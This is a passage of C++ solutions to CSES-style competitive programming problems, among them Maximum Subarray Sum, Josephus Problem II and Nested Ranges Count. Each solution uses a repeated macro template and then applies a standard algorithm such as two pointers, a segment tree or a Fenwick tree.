arr;    cin &gt;&gt; n &gt;&gt; x;    if (x % 2 == 0) divide = x / 2;    rep(i, 1, n) {        int a;        cin &gt;&gt; a, arr.insert({a, i});        if (a == x / 2 &amp;&amp; divide != -1) {            if (divide != x / 2) {                cout &lt;&lt; divide - x / 2 sp i &lt;&lt; '\\n';                return 0;            }            divide += i;        }    }    bool ok = false;    for (pii i : arr) {        if (i.F==x-i.F) continue;        if (arr.count(x - i.F)) {            cout &lt;&lt; i.S sp arr[x - i.F] &lt;&lt; '\\n';            ok = true;            break;        }    }    if (!ok) cout &lt;&lt; \"IMPOSSIBLE\\n\";    return 0;}\nMaximum Subarray Sum \nMaximum Subarray Sum#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int dp[200005], arr[200005];signed main() {    ios;    int n, ans;    cin &gt;&gt; n;    rep(i, 1, n) cin &gt;&gt; arr[i];    ans = dp[1] = arr[1];    rep(i, 2, n) tomax(ans, dp[i] = max((int)0, dp[i - 1]) + arr[i]);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nStick Lengths \nStick Lengths#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vi arr(n);    for (int &amp;i : arr) cin &gt;&gt; i;    sort(all(arr));    int mid = arr[n / 2], ans = 0;    for (int i : arr) ans += abs(i - mid);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nMissing Coin Sum \nMissing Coin Sum#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, add = 0;    cin &gt;&gt; n;    vi arr(n);    for (int &amp;i : arr) cin &gt;&gt; i;    sort(all(arr));    for (int i : arr) {        if (i - 1 &gt; add) {            cout &lt;&lt; add+1 &lt;&lt; '\\n';            return 0;        }add += i;    }    cout &lt;&lt; add + 1;    return 0;}\nCollecting Numbers \nCollecting Numbers#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, idx=0, ans=0;    cin &gt;&gt; n;    vi arr(n), r(n+1);    for(int &amp;i : arr) cin &gt;&gt; i, r[i]=idx++;    rep(i, 1, n){        while(i&lt;n &amp;&amp; r[i+1] &gt; r[i]) i++;        ans++;    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nCollecting Numbers II \nCollecting Numbers II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    // ios;    int n, idx = 0, ans = 0, m;    cin &gt;&gt; n &gt;&gt; m;    vi arr(n), r(n + 1);    for (int &amp;i : arr) cin &gt;&gt; i, r[i] = idx++;    rep(i, 1, n) {        while (i &lt; n &amp;&amp; r[i + 1] &gt; r[i]) i++;        ans++;    }    // cout &lt;&lt; ans &lt;&lt; '\\n';    while (m--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b, a--, b--;        int x = arr[a], y = arr[b];        swap(arr[a], arr[b]);        if (x-1&gt;=0 &amp;&amp; r[x-1] &lt;= r[x] &amp;&amp; r[x-1] &gt; b) ans++;        if (x-1&gt;=0 &amp;&amp; r[x-1] &gt; r[x] &amp;&amp; r[x-1] &lt;= b) ans--;        if (x+1&lt;=n &amp;&amp; r[x] &lt;= r[x+1] &amp;&amp; b &gt; r[x+1]) ans++;        if (x+1&lt;=n &amp;&amp; r[x] &gt; r[x+1] &amp;&amp; b &lt;= r[x+1]) ans--;        r[x] = b;        if (y-1&gt;=0 &amp;&amp; r[y-1] &lt;= r[y] &amp;&amp; r[y-1] &gt; a) ans++;        if (y-1&gt;=0 &amp;&amp; r[y-1] &gt; r[y] &amp;&amp; r[y-1] &lt;= a) ans--;        if (y+1&lt;=n &amp;&amp; r[y] &lt;= r[y+1] &amp;&amp; a &gt; r[y+1]) ans++;        if (y+1&lt;=n &amp;&amp; r[y] &gt; r[y+1] &amp;&amp; a &lt;= r[y+1]) ans--;        r[y] = a;        cout &lt;&lt; ans &lt;&lt; '\\n';    }    return 0;}\nPlaylist \nPlaylist#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vector&lt;int&gt; arr(n);    for(int &amp; i: arr) cin &gt;&gt; i;    int l=0, r=1, len = 1;    map&lt;int, int&gt; nums;    nums[arr[0]]=1;    while(r&lt;n){        while(r&lt;n &amp;&amp; nums[arr[r]]==0) nums[arr[r]]=1, r++;        // cout &lt;&lt; l sp r &lt;&lt; '\\n';        tomax(len, r-l);        nums[arr[l]]=0, l++;    }cout &lt;&lt; len &lt;&lt; '\\n';    return 0;}\nTowers \nTowers#include &lt;bits/stdc++.h&gt;using namespace std;#define int long long#define pii pair&lt;int, int&gt;#define F first #define S second#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define si set&lt;int&gt;#define mi map&lt;int, int&gt;#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int j = a; j &gt;=b; j++)#define tomax(a, b) (a)=max((a),(b))#define tomin(a,b) (a)=max((a,),(b))#define pob pop_back#define eb emplace_back#define pb push_back#define all(a) a.begin(),a.end()#define rall(a) a.rbegin(),a.rend()#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios::sync_with_stdio(0), cin.tie(0), cout.tie(0);signed main(){    ios;    int n;    cin &gt;&gt; n;    multiset&lt;int&gt; t;    rep(i, 1, n){        int k;        cin &gt;&gt; k, t.insert(k);        if(*t.rbegin()&gt;k &amp;&amp; t.upper_bound(k)!=t.end()) t.erase(t.upper_bound(k));        // for(int i : t) cout &lt;&lt; i &lt;&lt; ' ';        // cout &lt;&lt; '\\n';    }cout &lt;&lt; t.size() &lt;&lt; '\\n';    return 0;}\nTraffic Lights \nTraffic Lights#include &lt;bits/stdc++.h&gt;using namespace std;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define vii vector&lt;int, int&gt;#define si set&lt;int&gt;#define mii map&lt;int, int&gt;#define rep(i, a, b) for (int i = a; i &lt;= b; i++)#define rev(i, a, b) for (int i = a; i &gt;= b; i--)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define pob pop_back#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define rall(a) a.rbegin(), a.rend()#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios::sync_with_stdio(0), cin.tie(0), cout.tie(0);signed main() {    ios;    int x, n;    cin &gt;&gt; x &gt;&gt; n;    vi l(n);    for(int &amp;i : l) cin &gt;&gt; i;    si st;    mii len;    len[l[0]]++, len[x-l[0]]++, st.insert(l[0]);    cout &lt;&lt; (*len.rbegin()).F &lt;&lt; ' ';    l.erase(l.begin());    for(int i : l){        auto up = st.lower_bound(i);        if(up == st.begin()) {            len[*up]--, len[*up-i]++, len[i]++, st.insert(i);        }        else{            auto down = prev(up);            if(up == st.end()) {                len[x-*down]--, len[i-*down]++, len[x-i]++, st.insert(i);            }else len[*up-*down]--, len[i-*down]++, len[*up-i]++, st.insert(i);        }        // for(auto i : len) cout &lt;&lt; i.F &lt;&lt; ' ' &lt;&lt; i.S &lt;&lt; '\\n';        while(((*len.rbegin()).S)==0)  len.erase(prev(len.end()));        cout &lt;&lt; (*len.rbegin()).F &lt;&lt; ' ';    }    return 0;}\nJosephus Problem I \nJosephus Problem I#include &lt;bits/stdc++.h&gt;using namespace std;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define si set&lt;int&gt;#define mii map&lt;int, int&gt;#define tomax(a,b) (a)=max((a),(b))#define tomin(a,b) (A)=min((a),(b))#define rep(i, a, b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i++)#define pob pop_back#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define rall(a) a.rbegin(), a.rend()#define ios ios::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main(){    // ios;    int n;     cin &gt;&gt; n;    list&lt;int&gt; arr;    rep(i, 1, n) arr.push_back(i);    auto idx = next(arr.begin());    while(!arr.empty()){        cout &lt;&lt; *idx &lt;&lt; ' ';        if(arr.size()==1) break;        else if(arr.size()==2) arr.erase(idx), idx=arr.begin();         else if(idx==prev(arr.end())) arr.erase(idx), idx=next(arr.begin());        else if(idx==prev(arr.end(),2)) arr.erase(idx), idx=arr.begin();        else idx = next(idx, 2), arr.erase(prev(idx, 2));    }    return 0;}\nJosephus Problem II \nJosephus Problem II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc idx * 2 + 1#define rc idx * 2 + 2int seg[1000006];int n, k;//[l,r)void build(int idx, int l, int r) {    if (r == l + 1)        seg[idx] = 1;    else {        int mid = (r + l) / 2;        build(lc, l, mid), build(rc, mid, r);        seg[idx] = seg[lc] + seg[rc];    }}void del(int idx, int l, int r, int pos) {    seg[idx]--;    int mid = (r + l) / 2;    if (r == l + 1)  return;    else if (pos &gt;= mid) del(rc, mid, r, pos);    else del(lc, l, mid, pos);}int query(int idx, int l, int r, int sum){    // cerr &lt;&lt; idx sp seg[idx] sp l sp r sp sum &lt;&lt;'\\n';    int mid = (l+r)/2;    if(r==l+1) return l+sum;    else if(sum&gt;seg[lc]) return query(rc, mid, r, sum-seg[lc]);    else return query(lc, l, mid, sum);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; k;    k++;    build(0, 0, n);    int idx = 0;    rev(i, n, 1){        idx = (idx+(k%i))%i;        if(idx == 0) idx = i;        int pos = query(0, 0, n, idx);        cout &lt;&lt;  pos &lt;&lt; \" \";        del(0, 0, n, pos-1);        idx--;    }    return 0;}\nNested Ranges Check \nNested Ranges Check#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, a, b;    cin &gt;&gt; n;    vector&lt;bool&gt; con(n), coned(n);    vector&lt;pair&lt;pii, int&gt;&gt; ran;    rep(i, 0, n - 1) cin &gt;&gt; a &gt;&gt; b, ran.pb({{a, b}, i});    sort(all(ran), [](pair&lt;pii, int&gt; a, pair&lt;pii, int&gt; b) {        if (a.F.F == b.F.F) return a.F.S &gt; b.F.S;        return a.F.F &lt; b.F.F;    });    int max_r = 0;    for (auto i : ran) {        if (i.F.S &gt; max_r)            max_r = i.F.S, coned[i.S] = 0;        else            coned[i.S] = 1;    }    reverse(all(ran));    int min_r = 2e9;    for (auto i : ran) {        if (i.F.S &lt; min_r)            min_r = i.F.S, con[i.S] = 0;        else            con[i.S] = 1;    }    for (bool i : con) cout &lt;&lt; i &lt;&lt; ' ';    cout &lt;&lt; '\\n';    for (bool i : coned) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nNested Ranges Count \nNested Ranges Count#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int bit[200005];void update(int n, int x, int chg){    for(;x&lt;=n; x+=(x&amp;-x)) bit[x]+=chg;}int query(int x){    int ans = 0;    for(;x&gt;=1; x-=(x&amp;-x)) ans+=bit[x];    return ans;}signed main() {    // ios;    int n, a, b;    cin &gt;&gt; n;    vi con(n), coned(n);    mii bRank;    vector&lt;pair&lt;pii, int&gt;&gt; range;    rep(i, 0, n - 1) cin &gt;&gt; a &gt;&gt; b, range.pb({{a, b}, i}), bRank[b]=1;    int nn=1;    for(auto &amp;i : bRank) i.S=nn++;    nn--;    sort(all(range), [](pair&lt;pii, int&gt; a, pair&lt;pii, int&gt; b) {        if (a.F.F == b.F.F) return a.F.S &gt; b.F.S;        return a.F.F &lt; b.F.F;    });    int cnt = 0;    for (auto i : range) {        coned[i.S] = cnt-query(bRank[i.F.S]-1);        update(nn, bRank[i.F.S], 1);        cnt++;    }    reverse(all(range));    memset(bit, 0, sizeof(bit));    for (auto i : range) {        con[i.S] = query(bRank[i.F.S]);        update(nn, bRank[i.F.S], 1);        cnt++;    }    for (int i : con) cout &lt;&lt; i &lt;&lt; ' ';    cout &lt;&lt; '\\n';    for (int i : coned) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nRoom Allocation \nRoom Allocation#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, room = 0;    cin &gt;&gt; n;    vi ans(n);    vector&lt;pair&lt;pii, int&gt;&gt; d(n);    rep(i, 0, n - 1) cin &gt;&gt; d[i].F.F &gt;&gt; d[i].F.S, d[i].S = i;    sort(all(d));    priority_queue&lt;pii, vii, greater&lt;pii&gt;&gt; pq;    for (auto i : d) {        if (!pq.empty() &amp;&amp; pq.top().F &lt; i.F.F) {            ans[i.S] = pq.top().S;            pq.pop();            pq.push({i.F.S, ans[i.S]});        } else {            ++room;            pq.push({i.F.S, room});            ans[i.S] = room;        }    }    cout &lt;&lt; room &lt;&lt; '\\n';    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nFactory Machines \nFactory Machines#include &lt;bits/stdc++.h&gt;using namespace std;#define int long long#define pii pair&lt;int, int&gt;#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define si set&lt;int&gt;#define mii map&lt;int, int&gt;#define F first#define S second#define tomin(a,b) (a)=min(a,b)#define tomax(a,b) (a)=max(a,b)#define rep(i, a,b) for(int i = a; i&lt;=b; i++)#define rev(i, a, b) for(int i = a; i&gt;=b; i--)#define pb push_back#define eb emplace_back#define pob pop_back#define sp &lt;&lt; ' ' &lt;&lt;#define ios ios::sync_with_stdio(0), cin.tie(0), cout.tie(0);signed main(){    ios;    int n, t;    cin &gt;&gt; n &gt;&gt; t;    vi k(n);    for(int &amp;i : k) cin &gt;&gt; i;    int l=0, r = 1e18+1;    while(r&gt;l){        int mid = (r+l)/2;        int p = 0;        bool overflow = false;        for(int i : k) p+=mid/i, overflow = overflow || p&lt;0;        if(p&gt;=t || overflow) r=mid;        else l=mid+1;    }cout &lt;&lt; r &lt;&lt; '\\n';    return 0;}\nTasks and Deadlines \nTasks and Deadlines#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vii t(n);    for(auto &amp;i : t) cin &gt;&gt; i.F &gt;&gt; i.S;    sort(all(t));    int ans = 0, time = 0;    for(auto i : t){        time+=i.F;        ans += i.S-time;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nReading Books \nReading Books#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, sum = 0, max_time = 0;    cin &gt;&gt; n;    rep(i, 1, n) {        int t;        cin &gt;&gt; t;        tomax(max_time, t);        sum += t;    }    cout &lt;&lt; max(max_time * 2, sum);    return 0;}\nSum of Three Values \nSum of Three Values#include &lt;bits/stdc++.h&gt;using namespace std;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x;    cin &gt;&gt; n &gt;&gt; x;    vector&lt;pair&lt;int, int&gt;&gt; num(n);    rep(i, 1, n) cin &gt;&gt; num[i - 1].F, num[i - 1].S = i;    sort(num.begin(), num.end());    rep(i, 0, n-1) {        int tar = x - num[i].F;        int l = 0, r = n - 1;        while (r &gt; l) {            if (l != i &amp;&amp; r != i &amp;&amp; num[l].F + num[r].F == tar) {                cout &lt;&lt; num[l].S sp num[r].S sp num[i].S &lt;&lt; '\\n';                return 0;            }            if (num[l].F + num[r].F &gt; tar)                r--;            else                l++;        }    }    cout &lt;&lt; \"IMPOSSIBLE\\n\";    return 0;}\nSum of Four Values \nSum of Four Values#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x;    cin &gt;&gt; n &gt;&gt; x;    vii num(n);    rep(i, 1, n) cin &gt;&gt; num[i - 1].F, num[i - 1].S = i;    sort(all(num));    unordered_map&lt;int, pii&gt; pos;    rep(i, 0, n - 1) {        rep(j, i + 1, n - 1) {            auto pt = pos.find(x - num[i].F - num[j].F);            if (pt != pos.end()) {                cout &lt;&lt; num[i].S sp num[j].S sp pt-&gt;S.F sp pt-&gt;S.S &lt;&lt; '\\n';                return 0;            }        }        rep(j, 0, i - 1)            pos.insert({num[i].F + num[j].F, {num[i].S, num[j].S}});    }    cout &lt;&lt; \"IMPOSSIBLE\\n\";    return 0;}\nNearest Smaller Values \nNearest Smaller Values#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vii arr;    rep(i, 1, n) {        int x;        cin &gt;&gt; x;        while(!arr.empty() &amp;&amp; arr.back().F&gt;=x) arr.pob();        if(!arr.empty()) cout &lt;&lt; arr.back().S &lt;&lt; ' ';        else cout &lt;&lt; \"0 \";        arr.eb(x,i);    }    return 0;}\nSubarray Sums I \nSubarray Sums I#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x, ans = 0;    cin &gt;&gt; n &gt;&gt; x;    vi arr(n);    for(int &amp;i : arr) cin &gt;&gt; i;    int r = 1, l=0, sum=arr[0];    while(r&lt;=n){        if(sum==x) ans++, sum+=arr[r++];        else if(sum&lt;x) sum+=arr[r++];        else sum-=arr[l++];    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nSubarray Sums II \nSubarray Sums II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x, ans = 0;    cin &gt;&gt; n &gt;&gt; x;    vi sum(n+1);    map&lt;int, vi&gt; ms;    sum[0]=0;    ms[0].eb(0);    rep(i, 1, n) cin &gt;&gt; sum[i], sum[i]+=sum[i-1], ms[sum[i]].eb(i);    rep(i, 1, n){        if(!ms[sum[i]-x].empty() &amp;&amp; *ms[sum[i]-x].begin()&lt;i) ans+=(lower_bound(all(ms[sum[i]-x]),i)-ms[sum[i]-x].begin());    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nSubarray Divisibility \nSubarray Divisibility#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define 